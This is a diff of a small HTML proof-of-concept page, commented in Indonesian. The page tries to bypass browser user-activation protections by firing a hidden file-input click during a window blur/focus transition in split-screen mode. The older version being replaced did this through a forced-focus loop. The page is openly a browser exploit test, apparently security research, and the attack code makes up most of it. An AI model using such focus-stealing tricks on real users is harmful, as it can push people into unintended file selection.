@@ -1,77 +1,72 @@
 <!doctype html>
 <html>
   <head>
-    <title>POC: Focus-Stealing & Race Condition</title>
+    <title>POC: Focus-Stealing Race Condition (Refined)</title>
     <style>
       body {
         font-family: sans-serif;
         text-align: center;
-        padding-top: 50px;
+        padding: 50px;
       }
       #link {
-        padding: 20px;
-        border: 2px dashed red;
+        padding: 30px;
+        border: 3px solid green;
         cursor: pointer;
-        display: block;
+        display: inline-block;
+        background: #f0fff0;
       }
       .status {
         margin-top: 20px;
-        color: blue;
-      }
-      input {
-        display: none;
+        font-weight: bold;
       }
     </style>
   </head>
   <body>
-    <h1>Race Condition Test</h1>
-    <p>Buka dalam mode <b>Split Screen</b> (Contoh: Edge/Chrome di Android).</p>
+    <h2>Race Condition: Transition Test</h2>
+    <p>Gunakan ini untuk mengetes tanpa terhalang file picker terus-menerus.</p>
 
-    <a id="link"
-      >1. Klik Kanan Sini (Split)<br />2. Cepat klik aplikasi sebelah!</a
-    >
+    <div id="link">
+      1. KLIK KANAN DI SINI <br />
+      (Status: Ready)
+    </div>
 
-    <div id="status" class="status">Menunggu interaksi...</div>
-
-    <input id="fileSelect" type="file" />
+    <div id="status" class="status">Status: Idle</div>
+    <input id="fileSelect" type="file" style="display: none" />
 
     <script>
       const link = document.getElementById("link");
       const fileSelect = document.getElementById("fileSelect");
       const status = document.getElementById("status");
+      let isArmed = false;
 
-      link.addEventListener("contextmenu", function (event) {
-        status.innerText = "Trigger dimulai... Segera pindah fokus!";
+      // Langkah 1: Persiapkan pemicu (Arming the trigger)
+      link.addEventListener("contextmenu", function (e) {
+        isArmed = true;
+        link.style.borderColor = "red";
+        link.innerText = "Skenario AKTIF! Sekarang coba buka Split View.";
+        status.innerText = "Status: Menunggu transisi fokus (blur)...";
 
-        // Skenario Race Condition:
-        // Mencoba memicu input berulang kali dalam jendela waktu yang sempit
-        // saat transisi fokus terjadi.
-
-        let attempts = 0;
-        const interval = setInterval(() => {
-          attempts++;
-
-          // Coba curi fokus kembali secara paksa sebelum klik
-          window.focus();
-
-          // Pemicuan file picker
-          fileSelect.click();
-
-          if (attempts > 10) {
-            clearInterval(interval);
-            status.innerText = "Siklus percobaan selesai.";
+        // Memberikan jendela waktu 5 detik untuk kamu melakukan aksi split view
+        setTimeout(() => {
+          if (isArmed) {
+            isArmed = false;
+            status.innerText =
+              "Status: Timeout (Gagal pindah fokus tepat waktu)";
+            link.style.borderColor = "green";
           }
-        }, 500); // Interval 500ms untuk mencari celah saat tab menjadi 'inactive'
+        }, 5000);
       });
 
-      // Listener tambahan untuk mendeteksi kapan tab kehilangan fokus
+      // Langkah 2: Pemicuan hanya terjadi saat fokus hilang (Blur)
       window.addEventListener("blur", () => {
-        console.log("Tab menjadi Inactive (Blur detected)");
-        // Beberapa browser memiliki celah di mana event 'blur'
-        // masih mengizinkan satu aksi terakhir dari script yang berjalan.
-        setTimeout(() => {
+        if (isArmed) {
+          // Ini adalah momen krusial: saat kamu klik area split lain,
+          // kita coba tembus pengaman browser.
           fileSelect.click();
-        }, 50);
+          isArmed = false; // Matikan agar tidak mengganggu lagi
+          status.innerText = "Status: Mencoba bypass saat transisi fokus!";
+          console.log("Exploit attempt fired during blur event.");
+        }
       });
     </script>
   </body>
